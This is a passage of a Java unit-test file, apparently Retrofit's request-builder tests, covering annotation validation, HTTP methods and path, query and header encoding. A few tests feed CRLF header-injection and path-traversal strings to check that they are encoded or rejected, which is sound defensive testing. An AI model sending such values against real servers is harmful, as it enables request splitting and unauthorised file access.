 }\n  }\n\n  @Test public void headersFailWhenMalformed() {\n    class Example {\n      @GET(\"/\") //\n      @Headers(\"Malformed\") //\n      Call<ResponseBody> method() {\n        return null;\n      }\n    }\n    try {\n      buildRequest(Example.class);\n      fail();\n    } catch (IllegalArgumentException e) {\n      assertThat(e).hasMessage(\n          \"@Headers value must be in the form \\\"Name: Value\\\". Found: \\\"Malformed\\\"\\n    for method Example.method\");\n    }\n  }\n\n  @Test public void pathParamNonPathParamAndTypedBytes() {\n    class Example {\n      @PUT(\"/{a}\") //\n      Call<ResponseBody> method(@Path(\"a\") int a, @Path(\"b\") int b, @Body int c) {\n        return null;\n      }\n    }\n    try {\n      buildRequest(Example.class);\n      fail();\n    } catch (IllegalArgumentException e) {\n      assertThat(e).hasMessage(\n          \"URL \\\"/{a}\\\" does not contain \\\"{b}\\\". (parameter #2)\\n    for method Example.method\");\n    }\n  }\n\n  @Test public void parameterWithoutAnnotation() {\n    class Example {\n      @GET(\"/\") //\n      Call<ResponseBody> method(String a) {\n        return null;\n      }\n    }\n    try {\n      buildRequest(Example.class);\n      fail();\n    } catch (IllegalArgumentException e) {\n      assertThat(e).hasMessage(\n          \"No Retrofit annotation found. (parameter #1)\\n    for method Example.method\");\n    }\n  }\n\n  @Test public void nonBodyHttpMethodWithSingleEntity() {\n    class Example {\n      @GET(\"/\") //\n      Call<ResponseBody> method(@Body String o) {\n        return null;\n      }\n    }\n    try {\n      buildRequest(Example.class);\n      fail();\n    } catch (IllegalArgumentException e) {\n      assertThat(e).hasMessage(\n          \"Non-body HTTP method cannot contain @Body.\\n    for method Example.method\");\n    }\n  }\n\n  @Test public void queryMapMustBeAMap() {\n    class Example {\n      @GET(\"/\") //\n      Call<ResponseBody> method(@QueryMap List<String> a) {\n        return null;\n      }\n    }\n    try {\n      buildRequest(Example.class);\n      fail();\n    } catch (IllegalArgumentException e) {\n      assertThat(e).hasMessage(\n          \"@QueryMap parameter type must be Map. (parameter #1)\\n    for method Example.method\");\n    }\n  }\n\n  @Test public void queryMapSupportsSubclasses() {\n    class Foo extends HashMap<String, String> {\n    }\n\n    class Example {\n      @GET(\"/\") //\n      Call<ResponseBody> method(@QueryMap Foo a) {\n        return null;\n      }\n    }\n\n    Foo foo = new Foo();\n    foo.put(\"hello\", \"world\");\n\n    Request request = buildRequest(Example.class, foo);\n    assertThat(request.url().toString()).isEqualTo(\"http://example.com/?hello=world\");\n  }\n\n  @Test public void queryMapRejectsNull() {\n    class Example {\n      @GET(\"/\") //\n      Call<ResponseBody> method(@QueryMap Map<String, String> a) {\n        return null;\n      }\n    }\n\n    try {\n      buildRequest(Example.class, new Object[] { null });\n      fail();\n    } catch (IllegalArgumentException e) {\n      assertThat(e).hasMessage(\"Query map was null.\");\n    }\n  }\n\n  @Test public void queryMapRejectsNullKeys() {\n    class Example {\n      @GET(\"/\") //\n      Call<ResponseBody> method(@QueryMap Map<String, String> a) {\n        return null;\n      }\n    }\n\n    Map<String, String> queryParams = new LinkedHashMap<>();\n    queryParams.put(\"ping\", \"pong\");\n    queryParams.put(null, \"kat\");\n\n    try {\n      buildRequest(Example.class, queryParams);\n      fail();\n    } catch (IllegalArgumentException e) {\n      assertThat(e).hasMessage(\"Query map contained null key.\");\n    }\n  }\n\n  @Test public void queryMapRejectsNullValues() {\n    class Example {\n      @GET(\"/\") //\n      Call<ResponseBody> method(@QueryMap Map<String, String> a) {\n        return null;\n      }\n    }\n\n    Map<String, String> queryParams = new LinkedHashMap<>();\n    queryParams.put(\"ping\", \"pong\");\n    queryParams.put(\"kit\", null);\n\n    try {\n      buildRequest(Example.class, queryParams);\n      fail();\n    } catch (IllegalArgumentException e) {\n      assertThat(e).hasMessage(\"Query map contained null value for key 'kit'.\");\n    }\n  }\n\n  @Test public void getWithHeaderMap() {\n    class Example {\n      @GET(\"/search\")\n      Call<ResponseBody> method(@HeaderMap Map<String, Object> headers) {\n        return null;\n      }\n    }\n\n    Map<String, Object> headers = new LinkedHashMap<>();\n    headers.put(\"Accept\", \"text/plain\");\n    headers.put(\"Accept-Charset\", \"utf-8\");\n\n    Request request = buildRequest(Example.class, headers);\n    assertThat(request.method()).isEqualTo(\"GET\");\n    assertThat(request.url().toString()).isEqualTo(\"http://example.com/search\");\n    assertThat(request.body()).isNull();\n    assertThat(request.headers().size()).isEqualTo(2);\n    assertThat(request.header(\"Accept\")).isEqualTo(\"text/plain\");\n    assertThat(request.header(\"Accept-Charset\")).isEqualTo(\"utf-8\");\n  }\n\n  @Test public void headerMapMustBeAMap() {\n    class Example {\n      @GET(\"/\")\n      Call<ResponseBody> method(@HeaderMap List<String> headers) {\n        return null;\n      }\n    }\n    try {\n      buildRequest(Example.class);\n      fail();\n    } catch (IllegalArgumentException e) {\n      assertThat(e).hasMessage(\n          \"@HeaderMap parameter type must be Map. (parameter #1)\\n    for method Example.method\");\n    }\n  }\n\n  @Test public void headerMapSupportsSubclasses() {\n    class Foo extends HashMap<String, String> {\n    }\n\n    class Example {\n      @GET(\"/search\")\n      Call<ResponseBody> method(@HeaderMap Foo headers) {\n        return null;\n      }\n    }\n\n    Foo headers = new Foo();\n    headers.put(\"Accept\", \"text/plain\");\n\n    Request request = buildRequest(Example.class, headers);\n    assertThat(request.url().toString()).isEqualTo(\"http://example.com/search\");\n    assertThat(request.headers().size()).isEqualTo(1);\n    assertThat(request.header(\"Accept\")).isEqualTo(\"text/plain\");\n  }\n\n  @Test public void headerMapRejectsNull() {\n    class Example {\n      @GET(\"/\")\n      Call<ResponseBody> method(@HeaderMap Map<String, String> headers) {\n        return null;\n      }\n    }\n\n    try {\n      buildRequest(Example.class, (Map<String, String>) null);\n      fail();\n    } catch (IllegalArgumentException e) {\n      assertThat(e).hasMessage(\"Header map was null.\");\n    }\n  }\n\n  @Test public void headerMapRejectsNullKeys() {\n    class Example {\n      @GET(\"/\")\n      Call<ResponseBody> method(@HeaderMap Map<String, String> headers) {\n        return null;\n      }\n    }\n\n    Map<String, String> headers = new LinkedHashMap<>();\n    headers.put(\"Accept\", \"text/plain\");\n    headers.put(null, \"utf-8\");\n\n    try {\n      buildRequest(Example.class, headers);\n      fail();\n    } catch (IllegalArgumentException e) {\n      assertThat(e).hasMessage(\"Header map contained null key.\");\n    }\n  }\n\n  @Test public void headerMapRejectsNullValues() {\n    class Example {\n      @GET(\"/\")\n      Call<ResponseBody> method(@HeaderMap Map<String, String> headers) {\n        return null;\n      }\n    }\n\n    Map<String, String> headers = new LinkedHashMap<>();\n    headers.put(\"Accept\", \"text/plain\");\n    headers.put(\"Accept-Charset\", null);\n\n    try {\n      buildRequest(Example.class, headers);\n      fail();\n    } catch (IllegalArgumentException e) {\n      assertThat(e).hasMessage(\"Header map contained null value for key 'Accept-Charset'.\");\n    }\n  }\n\n  @Test public void twoBodies() {\n    class Example {\n      @PUT(\"/\") //\n      Call<ResponseBody> method(@Body String o1, @Body String o2) {\n        return null;\n      }\n    }\n    try {\n      buildRequest(Example.class);\n      fail();\n    } catch (IllegalArgumentException e) {\n      assertThat(e).hasMessage(\n          \"Multiple @Body method annotations found. (parameter #2)\\n    for method Example.method\");\n    }\n  }\n\n  @Test public void bodyInNonBodyRequest() {\n    class Example {\n      @Multipart //\n      @PUT(\"/\") //\n      Call<ResponseBody> method(@Part(\"one\") String o1, @Body String o2) {\n        return null;\n      }\n    }\n    try {\n      buildRequest(Example.class);\n      fail();\n    } catch (IllegalArgumentException e) {\n      assertThat(e).hasMessage(\n          \"@Body parameters cannot be used with form or multi-part encoding. (parameter #2)\\n    for method Example.method\");\n    }\n  }\n\n  @Test public void get() {\n    class Example {\n      @GET(\"/foo/bar/\") //\n      Call<ResponseBody> method() {\n        return null;\n      }\n    }\n    Request request = buildRequest(Example.class);\n    assertThat(request.method()).isEqualTo(\"GET\");\n    assertThat(request.headers().size()).isZero();\n    assertThat(request.url().toString()).isEqualTo(\"http://example.com/foo/bar/\");\n    assertThat(request.body()).isNull();\n  }\n\n  @Test public void delete() {\n    class Example {\n      @DELETE(\"/foo/bar/\") //\n      Call<ResponseBody> method() {\n        return null;\n      }\n    }\n    Request request = buildRequest(Example.class);\n    assertThat(request.method()).isEqualTo(\"DELETE\");\n    assertThat(request.headers().size()).isZero();\n    assertThat(request.url().toString()).isEqualTo(\"http://example.com/foo/bar/\");\n    assertNull(request.body());\n  }\n\n  @Test public void head() {\n    class Example {\n      @HEAD(\"/foo/bar/\") //\n      Call<Void> method() {\n        return null;\n      }\n    }\n    Request request = buildRequest(Example.class);\n    assertThat(request.method()).isEqualTo(\"HEAD\");\n    assertThat(request.headers().size()).isZero();\n    assertThat(request.url().toString()).isEqualTo(\"http://example.com/foo/bar/\");\n    assertThat(request.body()).isNull();\n  }\n\n  @Test public void headWithoutVoidThrows() {\n    class Example {\n      @HEAD(\"/foo/bar/\") //\n      Call<ResponseBody> method() {\n        return null;\n      }\n    }\n    try {\n      buildRequest(Example.class);\n    } catch (IllegalArgumentException e) {\n      assertThat(e).hasMessage(\n          \"HEAD method must use Void as response type.\\n    for method Example.method\");\n    }\n  }\n\n  @Test public void post() {\n    class Example {\n      @POST(\"/foo/bar/\") //\n      Call<ResponseBody> method(@Body RequestBody body) {\n        return null;\n      }\n    }\n    RequestBody body = RequestBody.create(TEXT_PLAIN, \"hi\");\n    Request request = buildRequest(Example.class, body);\n    assertThat(request.method()).isEqualTo(\"POST\");\n    assertThat(request.headers().size()).isZero();\n    assertThat(request.url().toString()).isEqualTo(\"http://example.com/foo/bar/\");\n    assertBody(request.body(), \"hi\");\n  }\n\n  @Test public void put() {\n    class Example {\n      @PUT(\"/foo/bar/\") //\n      Call<ResponseBody> method(@Body RequestBody body) {\n        return null;\n      }\n    }\n    RequestBody body = RequestBody.create(TEXT_PLAIN, \"hi\");\n    Request request = buildRequest(Example.class, body);\n    assertThat(request.method()).isEqualTo(\"PUT\");\n    assertThat(request.headers().size()).isZero();\n    assertThat(request.url().toString()).isEqualTo(\"http://example.com/foo/bar/\");\n    assertBody(request.body(), \"hi\");\n  }\n\n  @Test public void patch() {\n    class Example {\n      @PATCH(\"/foo/bar/\") //\n      Call<ResponseBody> method(@Body RequestBody body) {\n        return null;\n      }\n    }\n    RequestBody body = RequestBody.create(TEXT_PLAIN, \"hi\");\n    Request request = buildRequest(Example.class, body);\n    assertThat(request.method()).isEqualTo(\"PATCH\");\n    assertThat(request.headers().size()).isZero();\n    assertThat(request.url().toString()).isEqualTo(\"http://example.com/foo/bar/\");\n    assertBody(request.body(), \"hi\");\n  }\n\n  @Test public void options() {\n    class Example {\n      @OPTIONS(\"/foo/bar/\") //\n      Call<ResponseBody> method() {\n        return null;\n      }\n    }\n    Request request = buildRequest(Example.class);\n    assertThat(request.method()).isEqualTo(\"OPTIONS\");\n    assertThat(request.headers().size()).isZero();\n    assertThat(request.url().toString()).isEqualTo(\"http://example.com/foo/bar/\");\n    assertThat(request.body()).isNull();\n  }\n\n  @Test public void getWithPathParam() {\n    class Example {\n      @GET(\"/foo/bar/{ping}/\") //\n      Call<ResponseBody> method(@Path(\"ping\") String ping) {\n        return null;\n      }\n    }\n    Request request = buildRequest(Example.class, \"po ng\");\n    assertThat(request.method()).isEqualTo(\"GET\");\n    assertThat(request.headers().size()).isZero();\n    assertThat(request.url().toString()).isEqualTo(\"http://example.com/foo/bar/po%20ng/\");\n    assertThat(request.body()).isNull();\n  }\n\n  @Test public void getWithUnusedAndInvalidNamedPathParam() {\n    class Example {\n      @GET(\"/foo/bar/{ping}/{kit,kat}/\") //\n      Call<ResponseBody> method(@Path(\"ping\") String ping) {\n        return null;\n      }\n    }\n    Request request = buildRequest(Example.class, \"pong\");\n    assertThat(request.method()).isEqualTo(\"GET\");\n    assertThat(request.headers().size()).isZero();\n    assertThat(request.url().toString()).isEqualTo(\"http://example.com/foo/bar/pong/%7Bkit,kat%7D/\");\n    assertThat(request.body()).isNull();\n  }\n\n  @Test public void getWithEncodedPathParam() {\n    class Example {\n      @GET(\"/foo/bar/{ping}/\") //\n      Call<ResponseBody> method(@Path(value = \"ping\", encoded = true) String ping) {\n        return null;\n      }\n    }\n    Request request = buildRequest(Example.class, \"po%20ng\");\n    assertThat(request.method()).isEqualTo(\"GET\");\n    assertThat(request.headers().size()).isZero();\n    assertThat(request.url().toString()).isEqualTo(\"http://example.com/foo/bar/po%20ng/\");\n    assertThat(request.body()).isNull();\n  }\n\n  @Test public void getWithEncodedPathSegments() {\n    class Example {\n      @GET(\"/foo/bar/{ping}/\") //\n      Call<ResponseBody> method(@Path(value = \"ping\", encoded = true) String ping) {\n        return null;\n      }\n    }\n    Request request = buildRequest(Example.class, \"baz/pong/more\");\n    assertThat(request.method()).isEqualTo(\"GET\");\n    assertThat(request.headers().size()).isZero();\n    assertThat(request.url().toString()).isEqualTo(\"http://example.com/foo/bar/baz/pong/more/\");\n    assertThat(request.body()).isNull();\n  }\n\n  @Test public void getWithUnencodedPathSegmentsPreventsRequestSplitting() {\n    class Example {\n      @GET(\"/foo/bar/{ping}/\") //\n      Call<ResponseBody> method(@Path(value = \"ping\", encoded = false) String ping) {\n        return null;\n      }\n    }\n    Request request = buildRequest(Example.class, \"baz/\\r\\nheader: blue\");\n    assertThat(request.method()).isEqualTo(\"GET\");\n    assertThat(request.headers().size()).isZero();\n    assertThat(request.url().toString()).isEqualTo(\"http://example.com/foo/bar/baz%2F%0D%0Aheader:%20blue/\");\n    assertThat(request.body()).isNull();\n  }\n\n  @Test public void getWithEncodedPathStillPreventsRequestSplitting() {\n    class Example {\n      @GET(\"/foo/bar/{ping}/\") //\n      Call<ResponseBody> method(@Path(value = \"ping\", encoded = true) String ping) {\n        return null;\n      }\n    }\n    Request request = buildRequest(Example.class, \"baz/\\r\\npong\");\n    assertThat(request.method()).isEqualTo(\"GET\");\n    assertThat(request.headers().size()).isZero();\n    assertThat(request.url().toString()).isEqualTo(\"http://example.com/foo/bar/baz/pong/\");\n    assertThat(request.body()).isNull();\n  }\n\n  @Test public void pathParametersAndPathTraversal() {\n    class Example {\n      @GET(\"/foo/bar/{ping}/\") //\n      Call<ResponseBody> method(@Path(value = \"ping\") String ping) {\n        return null;\n      }\n    }\n\n    assertMalformedRequest(Example.class, \".\");\n    assertMalformedRequest(Example.class, \"..\");\n\n    assertThat(buildRequest(Example.class, \"./a\").url().encodedPath())\n        .isEqualTo(\"/foo/bar/.%2Fa/\");\n    assertThat(buildRequest(Example.class, \"a/.\").url().encodedPath())\n        .isEqualTo(\"/foo/bar/a%2F./\");\n    assertThat(buildRequest(Example.class, \"a/..\").url().encodedPath())\n        .isEqualTo(\"/foo/bar/a%2F../\");\n    assertThat(buildRequest(Example.class, \"../a\").url().encodedPath())\n        .isEqualTo(\"/foo/bar/..%2Fa/\");\n    assertThat(buildRequest(Example.class, \"..\\\\..\").url().encodedPath())\n        .isEqualTo(\"/foo/bar/..%5C../\");\n\n    assertThat(buildRequest(Example.class, \"%2E\").url().encodedPath())\n        .isEqualTo(\"/foo/bar/%252E/\");\n    assertThat(buildRequest(Example.class, \"%2E%2E\").url().encodedPath())\n        .isEqualTo(\"/foo/bar/%252E%252E/\");\n  }\n\n  @Test public void encodedPathParametersAndPathTraversal() {\n    class Example {\n      @GET(\"/foo/bar/{ping}/\") //\n      Call<ResponseBody> method(@Path(value = \"ping\", encoded = true) String ping) {\n        return null;\n      }\n    }\n\n    assertMalformedRequest(Example.class, \".\");\n    assertMalformedRequest(Example.class, \"%2E\");\n    assertMalformedRequest(Example.class, \"%2e\");\n    assertMalformedRequest(Example.class, \"..\");\n    assertMalformedRequest(Example.class, \"%2E.\");\n    assertMalformedRequest(Example.class, \"%2e.\");\n    assertMalformedRequest(Example.class, \".%2E\");\n    assertMalformedRequest(Example.class, \".%2e\");\n    assertMalformedRequest(Example.class, \"%2E%2e\");\n    assertMalformedRequest(Example.class, \"%2e%2E\");\n    assertMalformedRequest(Example.class, \"./a\");\n    assertMalformedRequest(Example.class, \"a/.\");\n    assertMalformedRequest(Example.class, \"../a\");\n    assertMalformedRequest(Example.class, \"a/..\");\n    assertMalformedRequest(Example.class, \"a/../b\");\n    assertMalformedRequest(Example.class, \"a/%2e%2E/b\");\n\n    assertThat(buildRequest(Example.class, \"...\").url().encodedPath())\n        .isEqualTo(\"/foo/bar/.../\");\n    assertThat(buildRequest(Example.class, \"a..b\").url().encodedPath())\n        .isEqualTo(\"/foo/bar/a..b/\");\n    assertThat(buildRequest(Example.class, \"a..\").url().encodedPath())\n        .isEqualTo(\"/foo/bar/a../\");\n    assertThat(buildRequest(Example.class, \"a..b\").url().encodedPath())\n        .isEqualTo(\"/foo/bar/a..b/\");\n    assertThat(buildRequest(Example.class, \"..b\").url().encodedPath())\n        .isEqualTo(\"/foo/bar/..b/\");\n    assertThat(buildRequest(Example.class, \"..\\\\..\").url().encodedPath())\n        .isEqualTo(\"/foo/bar/..%5C../\");\n  }\n\n  @Test public void dotDotsOkayWhenNotFullPathSegment() {\n    class Example {\n      @GET(\"/foo{ping}bar/\") //\n      Call<ResponseBody> method(@Path(value = \"ping\", encoded = true) String ping) {\n        return null;\n      }\n    }\n\n    assertMalformedRequest(Example.class, \"/./\");\n    assertMalformedRequest(Example.class, \"/../\");\n\n    assertThat(buildRequest(Example.class, \".\").url().encodedPath()).isEqualTo(\"/foo.bar/\");\n    assertThat(buildRequest(Example.class, \"..\").url().encodedPath()).isEqualTo(\"/foo..bar/\");\n  }\n\n  @Test public void pathParamRequired() {\n    class Example {\n      @GET(\"/foo/bar/{ping}/\") //\n      Call<ResponseBody> method(@Path(\"ping\") String ping) {\n        return null;\n      }\n    }\n    try {\n      buildRequest(Example.class, new Object[] { null });\n      fail();\n    } catch (IllegalArgumentException e) {\n      assertThat(e.getMessage()).isEqualTo(\"Path parameter \\\"ping\\\" value must not be null.\");\n    }\n  }\n\n  @Test public void getWithQueryParam() {\n    class Example {\n      @GET(\"/foo/bar/\") //\n      Call<ResponseBody> method(@Query(\"ping\") String ping) {\n        return null;\n      }\n    }\n    Request request = buildRequest(Example.class, \"pong\");\n    assertThat(request.method()).isEqualTo(\"GET\");\n    assertThat(request.headers().size()).isZero();\n    assertThat(request.url().toString()).isEqualTo(\"http://example.com/foo/bar/?ping=pong\");\n    assertThat(request.body()).isNull();\n  }\n\n  @Test public void getWithEncodedQueryParam() {\n    class Example {\n      @GET(\"/foo/bar/\") //\n      Call<ResponseBody> method(@Query(value = \"pi%20ng\", encoded = true) String ping) {\n        return null;\n      }\n    }\n    Request request = buildRequest(Example.class, \"p%20o%20n%20g\");\n    assertThat(request.method()).isEqualTo(\"GET\");\n    assertThat(request.headers().size()).isZero();\n    assertThat(request.url().toString()).isEqualTo(\"http://example.com/foo/bar/?pi%20ng=p%20o%20n%20g\");\n    assertThat(request.body()).isNull();\n  }\n\n  @Test public void queryParamOptionalOmitsQuery() {\n    class Example {\n      @GET(\"/foo/bar/\") //\n      Call<ResponseBody> method(@Query(\"ping\") String ping) {\n        return null;\n      }\n    }\n    Request request = buildRequest(Example.class, new Object[] { null });\n    assertThat(request.url().toString()).isEqualTo(\"http://example.com/foo/bar/\");\n  }\n\n  @Test public void queryParamOptional() {\n    class Example {\n      @GET(\"/foo/bar/\") //\n      Call<ResponseBody> method(@Query(\"foo\") String foo, @Query(\"ping\") String ping,\n          @Query(\"kit\") String kit) {\n        return null;\n      }\n    }\n    Request request = buildRequest(Example.class, \"bar\", null, \"kat\");\n    assertThat(request.url().toString()).isEqualTo(\"http://example.com/foo/bar/?foo=bar&kit=kat\");\n  }\n\n  @Test public void getWithQueryUrlAndParam() {\n    class Example {\n      @GET(\"/foo/bar/?hi=mom\") //\n      Call<ResponseBody> method(@Query(\"ping\") String ping) {\n        return null;\n      }\n    }\n    Request request = buildRequest(Example.class, \"pong\");\n    assertThat(request.method()).isEqualTo(\"GET\");\n    assertThat(request.headers().size()).isZero();\n    assertThat(request.url().toString()).isEqualTo(\"http://example.com/foo/bar/?hi=mom&ping=pong\");\n    assertThat(request.body()).isNull();\n  }\n\n  @Test public void getWithQuery() {\n    class Example {\n      @GET(\"/foo/bar/?hi=mom\") //\n      Call<ResponseBody> method() {\n        return null;\n      }\n    }\n    Request request = buildRequest(Example.class);\n    assertThat(request.method()).isEqualTo(\"GET\");\n    assertThat(request.headers().size()).isZero();\n    assertThat(request.url().toString()).isEqualTo(\"http://example.com/foo/bar/?hi=mom\");\n    assertThat(request.body()).isNull();\n  }\n\n  @Test public void getWithPathAndQueryParam() {\n    class Example {\n      @GET(\"/foo/bar/{ping}/\") //\n      Call<ResponseBody> method(@Path(\"ping\") String ping, @Query(\"kit\") String kit,\n          @Query(\"riff\") String riff) {\n        return null;\n      }\n    }\n\n    Request request = buildRequest(Example.class, \"pong\", \"kat\", \"raff\");\n    assertThat(request.method()).isEqualTo(\"GET\");\n    assertThat(request.headers().size()).isZero();\n    assertThat(request.url().toString()).isEqualTo(\"http://example.com/foo/bar/pong/?kit=kat&riff=raff\");\n    assertThat(request.body()).isNull();\n  }\n\n  @Test public void getWithQueryThenPathThrows() {\n    class Example {\n      @GET(\"/foo/bar/{ping}/\") //\n      Call<ResponseBody> method(@Query(\"kit\") String kit, @Path(\"ping\") String ping) {\n        return null;\n      }\n    }\n\n    try {\n      buildRequest(Example.class, \"kat\", \"pong\");\n      fail();\n    } catch (IllegalArgumentException e) {\n      assertThat(e).hasMessage(\"A @Path parameter must not come after a @Query. (parameter #2)\\n\"\n          + \"    for method Example.method\");\n    }\n  }\n\n  @Test public void getWithQueryNameThenPathThrows() {\n    class Example {\n      @GET(\"/foo/bar/{ping}/\") //\n      Call<ResponseBody> method(@QueryName String kit, @Path(\"ping\") String ping) {\n        throw new AssertionError();\n      }\n    }\n\n    try {\n      buildRequest(Example.class, \"kat\", \"pong\");\n      fail();\n    } catch (IllegalArgumentException e) {\n      assertThat(e).hasMessage(\"A @Path parameter must not come after a @QueryName. (parameter #2)\\n\"\n          + \"    for method Example.method\");\n    }\n  }\n\n  @Test public void getWithQueryMapThenPathThrows() {\n    class Example {\n      @GET(\"/foo/bar/{ping}/\") //\n      Call<ResponseBody> method(@QueryMap Map<String, String> queries, @Path(\"ping\") String ping) {\n        throw new AssertionError();\n      }\n    }\n\n    try {\n      buildRequest(Example.class, Collections.singletonMap(\"kit\", \"kat\"), \"pong\");\n      fail();\n    } catch (IllegalArgumentException e) {\n      assertThat(e).hasMessage(\"A @Path parameter must not come after a @QueryMap. (parameter #2)\\n\"\n          + \"    for method Example.method\");\n    }\n  }\n\n  @Test public void getWithPathAndQueryQuestionMarkParam() {\n    class Example {\n      @GET(\"/foo/bar/{ping}/\") //\n      Call<ResponseBody> method(@Path(\"ping\") String ping, @Query(\"kit\") String kit) {\n        return null;\n      }\n    }\n\n    Request request = buildRequest(Example.class, \"pong?\", \"kat?\");\n    assertThat(request.method()).isEqualTo(\"GET\");\n    assertThat(request.headers().size()).isZero();\n    assertThat(request.url().toString())\n        .isEqualTo(\"http://example.com/foo/bar/pong%3F/?kit=kat%3F\");\n    assertThat(request.body()).isNull();\n  }\n\n  @Test public void getWithPathAndQueryAmpersandParam() {\n    class Example {\n      @GET(\"/foo/bar/{ping}/\") //\n      Call<ResponseBody> method(@Path(\"ping\") String ping, @Query(\"kit\") String kit) {\n        return null;\n      }\n    }\n\n    Request request = buildRequest(Example.class, \"pong&\", \"kat&\");\n    assertThat(request.method()).isEqualTo(\"GET\");\n    assertThat(request.headers().size()).isZero();\n    assertThat(request.url().toString()).isEqualTo(\"http://example.com/foo/bar/pong&/?kit=kat%26\");\n    assertThat(request.body()).isNull();\n  }\n\n  @Test public void getWithPathAndQueryHashParam() {\n    class Example {\n      @GET(\"/foo/bar/{ping}/\") //\n      Call<ResponseBody> method(@Path(\"ping\") String ping, @Query(\"kit\") String kit) {\n        return null;\n      }\n    }\n\n    Request request = buildRequest(Example.class, \"pong#\", \"kat#\");\n    assertThat(request.method()).isEqualTo(\"GET\");\n    assertThat(request.headers().size()).isZero();\n    assertThat(request.url().toString()).isEqualTo(\"http://example.com/foo/bar/pong%23/?kit=kat%23\");\n    assertThat(request.body()).isNull();\n  }\n\n  @Test public void getWithQueryParamList() {\n    class Example {\n      @GET(\"/foo/bar/\") //\n      Call<ResponseBody> method(@Query(\"key\") List<Object> keys) {\n        return null;\n      }\n    }\n\n    List<Object> values = Arrays.<Object>asList(1, 2, null, \"three\", \"1\");\n    Request request = buildRequest(Example.class, values);\n    assertThat(request.method()).isEqualTo(\"GET\");\n    assertThat(request.headers().size()).isZero();\n    assertThat(request.url().toString()).isEqualTo(\"http://example.com/foo/bar/?key=1&key=2&key=three&key=1\");\n    assertThat(request.body()).isNull();\n  }\n\n  @Test public void getWithQueryParamArray() {\n    class Example {\n      @GET(\"/foo/bar/\") //\n      Call<ResponseBody> method(@Query(\"key\") Object[] keys) {\n        return null;\n      }\n    }\n\n    Object[] values = { 1, 2, null, \"three\", \"1\" };\n    Request request = buildRequest(Example.class, new Object[] { values });\n    assertThat(request.method()).isEqualTo(\"GET\");\n    assertThat(request.headers().size()).isZero();\n    assertThat(request.url().toString()).isEqualTo(\"http://example.com/foo/bar/?key=1&key=2&key=three&key=1\");\n    assertThat(request.body()).isNull();\n  }\n\n  @Test public void getWithQueryParamPrimitiveArray() {\n    class Example {\n      @GET(\"/foo/bar/\") //\n      Call<ResponseBody> method(@Query(\"key\") int[] keys) {\n        return null;\n      }\n    }\n\n    int[] values = { 1, 2, 3, 1 };\n    Request request = buildRequest(Example.class, new Object[] { values });\n    assertThat(request.method()).isEqualTo(\"GET\");\n    assertThat(request.headers().size()).isZero();\n    assertThat(request.url().toString()).isEqualTo(\"http://example.com/foo/bar/?key=1&key=2&key=3&key=1\");\n    assertThat(request.body()).isNull();\n  }\n\n  @Test public void getWithQueryNameParam() {\n    class Example {\n      @GET(\"/foo/bar/\") //\n      Call<ResponseBody> method(@QueryName String ping) {\n        return null;\n      }\n    }\n    Request request = buildRequest(Example.class, \"pong\");\n    assertThat(request.method()).isEqualTo(\"GET\");\n    assertThat(request.headers().size()).isZero();\n    assertThat(request.url().toString()).isEqualTo(\"http://example.com/foo/bar/?pong\");\n    assertThat(request.body()).isNull();\n  }\n\n  @Test public void getWithEncodedQueryNameParam() {\n    class Example {\n      @GET(\"/foo/bar/\") //\n      Call<ResponseBody> method(@QueryName(encoded = true) String ping) {\n        return null;\n      }\n    }\n    Request request = buildRequest(Example.class, \"p%20o%20n%20g\");\n    assertThat(request.method()).isEqualTo(\"GET\");\n    assertThat(request.headers().size()).isZero();\n    assertThat(request.url().toString()).isEqualTo(\"http://example.com/foo/bar/?p%20o%20n%20g\");\n    assertThat(request.body()).isNull();\n  }\n\n  @Test public void queryNameParamOptionalOmitsQuery() {\n    class Example {\n      @GET(\"/foo/bar/\") //\n      Call<ResponseBody> method(@QueryName String ping) {\n        return null;\n      }\n    }\n    Request request = buildRequest(Example.class, new Object[] { null });\n    assertThat(request.url().toString()).isEqualTo(\"http://example.com/foo/bar/\");\n  }\n\n  @Test public void getWithQueryNameParamList() {\n    class Example {\n      @GET(\"/foo/bar/\") //\n      Call<ResponseBody> method(@QueryName List<Object> keys) {\n        return null;\n      }\n    }\n\n    List<Object> values = Arrays.<Object>asList(1, 2, null, \"three\", \"1\");\n    Request request = buildRequest(Example.class, values);\n    assertThat(request.method()).isEqualTo(\"GET\");\n    assertThat(request.headers().size()).isZero();\n    assertThat(request.url().toString()).isEqualTo(\"http://example.com/foo/bar/?1&2&three&1\");\n    assertThat(request.body()).isNull();\n  }\n\n  @Test public void getWithQueryNameParamArray() {\n    class Example {\n      @GET(\"/foo/bar/\") //\n      Call<ResponseBody> method(@QueryName Object[] keys) {\n        return null;\n      }\n    }\n\n    Object[] values = { 1, 2, null, \"three\", \"1\" };\n    Request request = buildRequest(Example.class, new Object[] { values });\n    assertThat(request.method()).isEqualTo(\"GET\");\n    assertThat(request.headers().size()).isZero();\n    assertThat(request.url().toString()).isEqualTo(\"http://example.com/foo/bar/?1&2&three&1\");\n    assertThat(request.body()).isNull();\n  }\n\n  @Test public void getWithQueryNameParamPrimitiveArray() {\n    class Example {\n      @GET(\"/foo/bar/\") //\n      Call<ResponseBody> method(@QueryName int[] keys) {\n        return null;\n      }\n    }\n\n    int[] values = { 1, 2, 3, 1 };\n    Request request = buildRequest(Example.class, new Object[] { values });\n    assertThat(request.method()).isEqualTo(\"GET\");\n    assertThat(request.headers().size()).isZero();\n    assertThat(request.url().toString()).isEqualTo(\"http://example.com/foo/bar/?1&2&3&1\");\n    assertThat(request.body()).isNull();\n  }\n\n  @Test public void getWithQueryParamMap() {\n    class Example {\n      @GET(\"/foo/bar/\") //\n      Call<ResponseBody> method(@QueryMap Map<String, Object> query) {\n        return null;\n      }\n    }\n\n    Map<String, Object> params = new LinkedHashMap<>();\n    params.put(\"kit\", \"kat\");\n    params.put(\"ping\", \"pong\");\n\n    Request request = buildRequest(Example.class, params);\n    assertThat(request.method()).isEqualTo(\"GET\");\n    assertThat(request.headers().size()).isZero();\n    assertThat(request.url().toString()).isEqualTo(\"http://example.com/foo/bar/?kit=kat&ping=pong\");\n    assertThat(request.body()).isNull();\n  }\n\n  @Test public void getWithEncodedQueryParamMap() {\n    class Example {\n      @GET(\"/foo/bar/\") //\n      Call<ResponseBody> method(@QueryMap(encoded = true) Map<String, Object> query) {\n        return null;\n      }\n    }\n\n    Map<String, Object> params = new LinkedHashMap<>();\n    params.put(\"kit\", \"k%20t\");\n    params.put(\"pi%20ng\", \"p%20g\");\n\n    Request request = buildRequest(Example.class, params);\n    assertThat(request.method()).isEqualTo(\"GET\");\n    assertThat(request.headers().size()).isZero();\n    